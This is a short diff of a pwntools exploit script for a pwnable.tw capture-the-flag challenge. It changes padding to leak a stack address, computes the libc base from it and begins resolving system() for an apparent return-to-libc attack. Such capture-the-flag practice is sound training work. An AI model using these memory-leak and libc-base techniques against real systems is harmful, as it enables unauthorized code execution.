@@ -6,12 +6,12 @@ r = remote('chall.pwnable.tw', 10101)
 libc = ELF('libc_32.so.6', checksec = False)
 
 #input()
-payload = b'a'*25
+payload = b'a'*29
 r.sendafter(b'name :', payload)
-r.recvuntil(b'a'*24)
+r.recvuntil(b'a'*28)
 leak = u32(r.recv(4))
 log.info("leak address: " + hex(leak))
-libc.address = leak - 0xc61
+libc.address = leak - 0x61 - 0x1b0000
 log.info("libc base: " + hex(libc.address))
 
 system = libc.sym['system']
